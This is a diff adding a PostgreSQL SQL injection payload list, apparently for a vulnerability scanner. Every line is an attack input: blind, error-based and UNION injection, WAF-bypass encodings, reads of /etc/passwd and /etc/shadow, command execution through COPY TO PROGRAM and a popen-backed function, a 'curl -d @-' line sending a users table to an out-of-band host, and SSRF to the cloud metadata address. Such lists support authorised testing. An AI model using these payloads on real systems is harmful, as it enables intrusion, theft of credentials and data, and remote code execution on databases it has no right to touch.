@@ -1,0 +1,60 @@
+# PostgreSQL SQLi — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+' OR pg_sleep(5)--
+' AND 1=CAST(version() AS integer)--
+# ── Advanced — time-based ──────────────────────────────────────────────────
+'; SELECT pg_sleep(5)--
+' AND (SELECT 1 FROM pg_sleep(5))='1
+# ── Advanced — error-based ─────────────────────────────────────────────────
+' AND 1=CAST(current_user AS integer)--
+' AND 1=CAST(current_database() AS integer)--
+# ── Advanced — RCE via COPY ────────────────────────────────────────────────
+'; COPY (SELECT '') TO PROGRAM 'sleep 5'--
+# ── Advanced — UNION-based ─────────────────────────────────────────────────
+' UNION SELECT null,version(),null--
+' UNION SELECT null,current_database(),null--
+' UNION SELECT null,current_user,null--
+' UNION SELECT null,inet_server_addr(),null--
+' UNION SELECT null,table_name,null FROM information_schema.tables LIMIT 1--
+' UNION SELECT null,usename,null FROM pg_user LIMIT 1--
+' UNION SELECT null,string_agg(schemaname||'.'||tablename,','),null FROM pg_tables--
+# ── Advanced — boolean-based ───────────────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR TRUE--
+' AND TRUE--
+admin'--
+# ── Advanced — file read ────────────────────────────────────────────────────
+'; SELECT pg_read_file('/etc/passwd',0,100)--
+# ── Advanced — WAF bypass ──────────────────────────────────────────────────
+/**/OR/**/1=1--
+' ORDER BY 1--
+' ORDER BY 100--
+# ── URL-encoded variants ───────────────────────────────────────────────────
+%27+OR+pg_sleep(5)--%20
+%27+AND+1%3dCAST(version()+AS+integer)--%20
+%2527+OR+pg_sleep(5)--
+%27/**/OR/**/pg_sleep(5)--%20
+# Mixed case
+' Or PG_SLEEP(5)-- -
+' uNION sELECT null,version(),null-- -
+# Hex encoding
+\x27 OR pg_sleep(5)-- -
+# Copy to program (requires superuser)
+'; COPY (SELECT 'hacked') TO PROGRAM 'curl http://INTERACTSH_URL/?c=rce'--
+'; COPY users TO PROGRAM 'curl -d @- http://INTERACTSH_URL/'--
+# pg_read_file / pg_ls_dir
+'; SELECT pg_ls_dir('/')--
+'; SELECT pg_read_file('/etc/shadow',0,4096)--
+'; SELECT pg_read_binary_file('/etc/passwd')--
+# OOB DNS via dblink
+'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=INTERACTSH_URL user=a password=a dbname=a')--
+# lo_import file read
+'; SELECT lo_import('/etc/passwd')--
+'; SELECT lo_get(lo_import('/etc/passwd'))--
+# Stacked queries
+'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer LANGUAGE internal VOLATILE AS 'popen'--
+'; SELECT * FROM (VALUES(1)) AS t(a) WHERE a=1 AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--
+# SSRF via dblink
+'; SELECT dblink_send_query('host=169.254.169.254 user=a password=a dbname=a','SELECT 1')--
